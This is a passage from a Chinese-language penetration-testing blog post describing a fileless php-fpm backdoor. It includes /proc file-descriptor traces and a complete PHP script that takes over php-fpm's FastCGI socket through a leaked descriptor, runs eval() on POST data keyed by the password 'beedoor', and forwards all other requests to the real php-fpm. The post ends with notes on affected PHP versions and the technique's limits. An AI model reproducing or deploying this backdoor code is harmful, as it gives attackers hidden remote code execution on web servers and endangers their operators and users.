<p>使用如下php代码进行注入测试并观察效果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// t4.php</span><br><span class="line"></span><br><span class="line">sleep(10);</span><br><span class="line">$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );</span><br><span class="line">sleep(10);</span><br><span class="line">system(&apos;/tmp/dup04&apos;);</span><br><span class="line">sleep(10);</span><br></pre></td></tr></table></figure>
<p>访问t4.php后查看文件句柄：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost html]# ls -al /proc/3022/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 25 16:12 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -&gt; socket:[1428126]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -&gt; anon_inode:[eventpoll]</span><br><span class="line"></span><br><span class="line">[root@localhost html]# ls -al /proc/3022/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 25 16:12 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -&gt; socket:[1428126]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -&gt; socket:[1435131]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -&gt; anon_inode:[eventpoll]</span><br><span class="line"></span><br><span class="line">[root@localhost html]# ls -al /proc/3022/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 25 16:12 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 25 16:12 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:59 3 -&gt; socket:[1428126]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:59 4 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 17:50 7 -&gt; anon_inode:[eventpoll]</span><br></pre></td></tr></table></figure>
<p>可以看到worker进程在前10秒内只有来自nginx的一个3号句柄；10-20秒多出来的4号句柄socket:[1435131]为php代码中socket_create后创建的socket；20秒后dup4运行结束，dup(0,2)成功调用，0号句柄的socket:[1168542]成功复制到4号句柄。此时php代码中已经可以通过$socket来操作php-fpm监听tcp 9000的socket了。</p>
<p>附上一个简单实现的脚本，通过php来解析fast-cgi并拦截特定请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$password = &quot;beedoor&quot;;</span><br><span class="line"></span><br><span class="line">function dolog($msg) &#123;</span><br><span class="line">    file_put_contents(&apos;/tmp/log&apos;, date(&apos;Y-m-d H:i:s&apos;) . &apos; ---- &apos; . $msg . &quot;\n&quot;, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function readfcgi($socket, $type) &#123;</span><br><span class="line">    global $password;</span><br><span class="line">    $buffer=&quot;&quot;;</span><br><span class="line">    $postdata=&quot;&quot;;</span><br><span class="line">    while(1) &#123;</span><br><span class="line">        dolog(&quot;Read 8 bytes header.&quot;);</span><br><span class="line"></span><br><span class="line">        $data = socket_read($socket, 8);</span><br><span class="line">        if ($data === &quot;&quot;)</span><br><span class="line">            return -1;</span><br><span class="line">        $buffer .= $data;</span><br><span class="line"></span><br><span class="line">        dolog(bin2hex($data));</span><br><span class="line"></span><br><span class="line">        $header = unpack(&quot;Cver/Ctype/nid/nlen/Cpadding/Crev&quot;, $data);</span><br><span class="line">        $body_len = $header[&quot;len&quot;] + $header[&quot;padding&quot;];</span><br><span class="line"></span><br><span class="line">        if ($body_len &gt; 0) &#123;</span><br><span class="line">            dolog(&quot;Read &quot; . $body_len . &quot; bytes body.&quot;);</span><br><span class="line">            $data = socket_read($socket, $body_len);</span><br><span class="line">            if ($data === &quot;&quot;)</span><br><span class="line">                return -1;</span><br><span class="line">            $buffer .= $data;</span><br><span class="line">            dolog(bin2hex($data));</span><br><span class="line"></span><br><span class="line">            if ($header[&quot;type&quot;] == 5) &#123;</span><br><span class="line">                $postdata .= $data;</span><br><span class="line">                dolog(&quot;Post data found.&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if ($header[&quot;type&quot;] == $type &amp;&amp; $body_len &lt; 65535) &#123;</span><br><span class="line">            $stype = $type === 5 ? &apos;FCGI_STDIN&apos; : &apos;FCGI_END_REQUEST&apos;;</span><br><span class="line">            dolog($stype . &quot; finished, braek.&quot;);</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //dolog(bin2hex($postdata));</span><br><span class="line">    parse_str($postdata, $post_array);</span><br><span class="line">    $intercept_flag = array_key_exists($password, $post_array) ? true : false;</span><br><span class="line">    if ($intercept_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        dolog(&quot;Password in postdata, intercepted.&quot;);</span><br><span class="line">        return array(&quot;intercept&quot; =&gt; true, &quot;buffer&quot; =&gt; $postdata);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        dolog(&quot;No password, passthrough.&quot;);</span><br><span class="line">        return array(&quot;intercept&quot; =&gt; false, &quot;buffer&quot; =&gt; $buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dolog(&quot;Init socket rescoure.&quot;);</span><br><span class="line"></span><br><span class="line">$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );</span><br><span class="line"></span><br><span class="line">dolog(&quot;dup(0,4);&quot;);</span><br><span class="line"></span><br><span class="line">system(&apos;/tmp/dup04&apos;);</span><br><span class="line"></span><br><span class="line">dolog(&quot;All set, waiting for connections.&quot;);</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">    $acpt=socket_accept($socket);</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Incoming connection.&quot;);</span><br><span class="line"></span><br><span class="line">    $buffer = readfcgi($acpt,5);</span><br><span class="line">    if ($buffer[&quot;intercept&quot;] === true) &#123;</span><br><span class="line">        parse_str($buffer[&quot;buffer&quot;], $postdata);</span><br><span class="line">        $header = &quot;&quot;;</span><br><span class="line">        $outbuffer = &quot;Content-type: text/html\r\n\r\n&quot;;</span><br><span class="line">        ob_clean();</span><br><span class="line">        ob_start();</span><br><span class="line">        eval($postdata[$password]);</span><br><span class="line">        $outbuffer .= ob_get_clean();</span><br><span class="line"></span><br><span class="line">        dolog(&quot;Eval code success.&quot;);</span><br><span class="line"></span><br><span class="line">        $outbuffer_len = strlen($outbuffer);</span><br><span class="line"></span><br><span class="line">        dolog(&quot;Outbuffer length: &quot; . $outbuffer_len . &quot;bytes.&quot;);</span><br><span class="line"></span><br><span class="line">        $slice_len = unpack(&quot;n&quot;, &quot;\x1f\xf8&quot;);</span><br><span class="line">        $slice_len = $slice_len[1];</span><br><span class="line"></span><br><span class="line">        while ( strlen($outbuffer) &gt; $slice_len ) &#123;</span><br><span class="line">            $slice = substr($outbuffer, 0, $slice_len);</span><br><span class="line"></span><br><span class="line">            $header = pack(&quot;C2n2C2&quot;, 0x01, 0x06, 1, $slice_len, 0x00, 0x00);</span><br><span class="line">            $sent_len = socket_write($acpt, $header, 8);</span><br><span class="line"></span><br><span class="line">            dolog(&quot;Sending &quot; . $sent_len . &quot; bytes slice header.&quot;);</span><br><span class="line">            dolog(bin2hex($header));</span><br><span class="line"></span><br><span class="line">            $sent_len = socket_write($acpt, $slice, $slice_len);</span><br><span class="line"></span><br><span class="line">            dolog(&quot;Sending &quot; . $sent_len . &quot; bytes slice.&quot;);</span><br><span class="line">            dolog(bin2hex($slice));</span><br><span class="line"></span><br><span class="line">            $outbuffer = substr($outbuffer, $slice_len);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $outbuffer_len = strlen($outbuffer);</span><br><span class="line">        if ( $outbuffer_len % 8 &gt; 0)</span><br><span class="line">            $padding_len = 8 - ($outbuffer_len % 8);</span><br><span class="line"></span><br><span class="line">        dolog(&quot;Processing last slice, outbuffer length: &quot; . $outbuffer_len . &quot; , padding length: &quot; . $padding_len . &quot; bytes.&quot;);</span><br><span class="line"></span><br><span class="line">        $outbuffer .= str_repeat(&quot;\0&quot;, $padding_len);</span><br><span class="line">        $header = pack(&quot;C2n2C2&quot;, 0x01, 0x06, 1, $outbuffer_len, $padding_len, 0x00);</span><br><span class="line"></span><br><span class="line">        $sent_len = socket_write($acpt, $header, 8);</span><br><span class="line">        dolog(&quot;Sent 8 bytes STDOUT header to webserver.&quot;);</span><br><span class="line">        dolog(bin2hex($header));</span><br><span class="line"></span><br><span class="line">        $sent_len = socket_write($acpt, $outbuffer, strlen($outbuffer));</span><br><span class="line">        dolog(&quot;Sent &quot; . $sent_len . &quot; bytes STDOUT body to webserver.&quot;);</span><br><span class="line">        dolog(bin2hex($outbuffer));</span><br><span class="line"></span><br><span class="line">        $header = pack(&quot;C2n2C2&quot;, 0x01, 0x03, 1, 8, 0x00, 0x00);</span><br><span class="line">        $endbody = pack(&quot;C8&quot;, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0);</span><br><span class="line"></span><br><span class="line">        $sent_len = socket_write($acpt, $header, 8);</span><br><span class="line">        dolog(&quot;Sent 8 bytes REQUEST_END header to webserver.&quot;);</span><br><span class="line">        dolog(bin2hex($header));</span><br><span class="line"></span><br><span class="line">        $sent_len = socket_write($acpt, $endbody, 8);</span><br><span class="line">        dolog(&quot;Sent 8 bytes REQUEST_END body to webserver.&quot;);</span><br><span class="line">        dolog(bin2hex($endbody));</span><br><span class="line"></span><br><span class="line">        socket_shutdown($acpt);</span><br><span class="line">        continue;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $buffer = $buffer[&quot;buffer&quot;];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dolog(&quot;The full buffer size is &quot; . strlen($buffer) . &quot; bytes.&quot;);</span><br><span class="line"></span><br><span class="line">    $fpm_socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">    if ($fpm_socket === false) &#123;</span><br><span class="line">        dolog(&quot;Create socket for real php-fpm failed.&quot;);</span><br><span class="line">        socket_close($acpt);</span><br><span class="line">    &#125;</span><br><span class="line">    if (socket_connect($fpm_socket, &quot;127.0.0.1&quot;, 9000) === false) &#123;</span><br><span class="line">        dolog(&quot;Connect to real php-fpm failed.&quot;);</span><br><span class="line">        socket_close($acpt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Connected to real php-fpm.&quot;);</span><br><span class="line"></span><br><span class="line">    $sent_len = socket_write($fpm_socket, $buffer, strlen($buffer));</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Sent &quot; . $sent_len . &quot; to real php-fpm.&quot;);</span><br><span class="line"></span><br><span class="line">    $buffer = readfcgi($fpm_socket, 3);</span><br><span class="line">    //TODO: intercept real output</span><br><span class="line">    $buffer = $buffer[&quot;buffer&quot;];</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Recieved &quot; . strlen($buffer) . &quot; from real php-fpm.&quot;);</span><br><span class="line"></span><br><span class="line">    socket_close($fpm_socket);</span><br><span class="line"></span><br><span class="line">    $sent_len = socket_write($acpt, $buffer);</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Sent &quot; . $sent_len . &quot; bytes back to webserver.&quot;);</span><br><span class="line"></span><br><span class="line">    socket_shutdown($acpt);</span><br><span class="line"></span><br><span class="line">    dolog(&quot;Shutdown connection from webserver.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><p>上面给出的php实现，利用的前提是php-fpm环境，同时有php版本限制，需5.x&lt;5.6.35，7.0.x&lt;7.0.29，7.1.x&lt;7.1.16，7.2.x&lt;7.2.4。因为利用到的两个条件中，worker进程未正确设置dumpable flag这个问题已经在CVE-2018-10545中修复，详情请自行查阅。而另一个条件，在php中通过system等函数来调用第三方程序时未正确处理文件描述符的问题，也已经提交给php官方，但php官方认为未能导致安全问题，不予处理。所以截止目前为止，最新版本的php-fpm都存在文件描述符泄露的问题。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>本文分享了一种php-fpm的另类后门实现，但比较受限。该方法虽然实现了无文件、无进程、能主动触发等特性，但是无法实现持续化，php-fpm服务重启后即失效；同时由于真实环境中php-fpm的worker进程众多，fast-cgi请求能被我们accept接受到的几率也比较小，不能稳定的触发。仅希望本文能抛砖引玉，引起大家对该问题进行更深入的探讨。如文中存在描述不准确的地方，欢迎大家批评指正。</p>
</div><div class="tags"><a href="/tags/Pentest/">Pentest</a><a href="/tags/Tool/">Tool</a></div><div class="post-nav"><a class="pre" href="/2019/01/21/awvs-script-decrypt/">awvs脚本解密工具</a><a class="next" href="/2017/12/24/full-functional-reverse-shell/">linux反弹完全交互shell</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="https://www.imbeee.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/Homelab/" style="font-size: 15px;">Homelab</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/Pentest/" style="font-size: 15px;">Pentest</a> <a href="/tags/Tool/" style="font-size: 15px;">Tool</a> <a href="/tags/Embedded/" style="font-size: 15px;">Embedded</a> <a href="/tags/ARM/" style="font-size: 15px;">ARM</a> <a href="/tags/LKM/" style="font-size: 15px;">LKM</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://imbeee.github.io/" title="Github Pages备份" target="_blank">Github Pages备份</a><ul></ul><a href="https://ymr.me/" title="野蛮人の洞窟" target="_blank">野蛮人の洞窟</a><ul></ul><a href="http://bksec.net/" title="my5t3ry的blog" target="_blank">my5t3ry的blog</a><ul></ul><a href="https://www.blackh4t.org/" title="DarkRay's BLoG.!" target="_blank">DarkRay's BLoG.!</a><ul></ul><a href="https://www.iswin.org/" title="随风's Blog" target="_blank">随风's Blog</a><ul></ul><a href="http://www.00theway.org/" title="00theway's Blog" target="_blank">00theway's Blog</a><ul></ul><a href="https://threathunter.org/" title="ThreatHunter社区" target="_blank">ThreatHunter社区</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">Beeeの零碎事.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>